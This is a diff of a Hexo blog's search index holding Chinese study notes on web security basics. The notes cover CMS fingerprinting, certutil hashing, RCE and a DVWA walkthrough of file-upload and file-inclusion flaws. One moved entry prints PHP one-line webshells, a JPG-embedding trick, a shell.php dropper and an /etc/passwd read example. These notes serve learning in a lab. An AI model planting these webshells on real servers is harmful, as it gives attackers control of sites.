+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
+<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
+<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
+<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
+<span id="more"></span>
+
+<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
+<p>然后输入命令</p>
+<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
+<p>如</p>
+<p>certutil -hashfile  webpro.war MD5</p>
+<p>注意后面有个MD5,不然会生成一个其他的值。</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安基础总结二</title>
     <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
     <content><![CDATA[<p><strong>本周重点</strong></p>
@@ -2271,29 +2294,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>网安基础总结三</title>
-    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
-<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
-<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
-<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
-<span id="more"></span>
-
-<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
-<p>然后输入命令</p>
-<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
-<p>如</p>
-<p>certutil -hashfile  webpro.war MD5</p>
-<p>注意后面有个MD5,不然会生成一个其他的值。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安基础总结五</title>
     <url>/2022/07/17/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%94/</url>
     <content><![CDATA[<h1 id="rce-远程命令-代码执行漏洞"><a href="#rce-远程命令-代码执行漏洞" class="headerlink" title="rce 远程命令/代码执行漏洞"></a>rce 远程命令/代码执行漏洞</h1><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h5><p>反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。</p>
@@ -2398,43 +2398,6 @@ include('files/'.$action.'.php'); //载入相应文件
 <p><img src="/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/1670060263796-9ff717b3-9e0c-4029-9cd4-cacfcb72b556.png" alt="img"></p>
 <p>解密后</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="comment">//flag&#123;hSh_ctf:e@syt0g3t&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结四</title>
-    <url>/2022/06/26/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%9B%9B/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。</p>
-<p>2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。</p>
-<p>3.MIME类型：一种文件拓展名包含一种MIME类型。</p>
-<span id="more"></span>
-
-<h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><p>第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p>
-<p>以下三条一句话木马</p>
-<p>1.<?php @eval($_POST['flag']);?>此类为POST类型一句话木马，需蚁剑连接。</p>
-<p>2.<?php eval($_REQUEST['php']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效）</p>
-<p>3.<?php system($_REQUEST['linux']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效）</p>
-<p>目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high”</p>
-<h6 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h6><p>将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。</p>
-<h6 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h6><p>此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。</p>
-<p>用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件</p>
-<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><h6 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h6><p>本地文件包含 Local File Include (LFI)</p>
-<p>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。</p>
-<p>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p>
-<h6 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h6><p>远程文件包含 Remote File Include (RFI)</p>
-<p>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。</p>
-<p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
-<p>文件包含漏洞也可以和文件上传漏洞相配合使用。</p>
-<p>通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。</p>
-<p> 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入   copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。</p>
-<?php fputs(fopen('shell.php','w'),'<?php eval($_post[flag]);>');?><p>这段代码意思是生成shell.php这个新文件，并将<?php eval($_post[flag]);>');?>写入。</p>
-<p>最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。</p>
-<p>这就叫条件竞争绕过  竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。</p>
-]]></content>
       <categories>
         <category>网安基础篇</category>
       </categories>
@@ -2625,6 +2588,43 @@ include('files/'.$action.'.php'); //载入相应文件
 <p>寒暑假逆袭的关键，而我却没有加以利用，认真去学习！</p>
 <p>接着开学封校，一直到九月中旬才能来校学习，这次，我不会再浪费时间，我一直以来的黑客梦永远不会消散。</p>
 <p>虽然道路艰难，但我会一直前行，漫漫长征路，偏向虎山行，此志共勉！</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结四</title>
+    <url>/2022/06/26/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%9B%9B/</url>
+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。</p>
+<p>2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。</p>
+<p>3.MIME类型：一种文件拓展名包含一种MIME类型。</p>
+<span id="more"></span>
+
+<h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><p>第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p>
+<p>以下三条一句话木马</p>
+<p>1.<?php @eval($_POST['flag']);?>此类为POST类型一句话木马，需蚁剑连接。</p>
+<p>2.<?php eval($_REQUEST['php']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效）</p>
+<p>3.<?php system($_REQUEST['linux']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效）</p>
+<p>目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high”</p>
+<h6 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h6><p>将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。</p>
+<h6 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h6><p>此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。</p>
+<p>用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件</p>
+<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><h6 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h6><p>本地文件包含 Local File Include (LFI)</p>
+<p>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。</p>
+<p>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p>
+<h6 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h6><p>远程文件包含 Remote File Include (RFI)</p>
+<p>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。</p>
+<p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
+<p>文件包含漏洞也可以和文件上传漏洞相配合使用。</p>
+<p>通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。</p>
+<p> 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入   copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。</p>
+<?php fputs(fopen('shell.php','w'),'<?php eval($_post[flag]);>');?><p>这段代码意思是生成shell.php这个新文件，并将<?php eval($_post[flag]);>');?>写入。</p>
+<p>最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。</p>
+<p>这就叫条件竞争绕过  竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
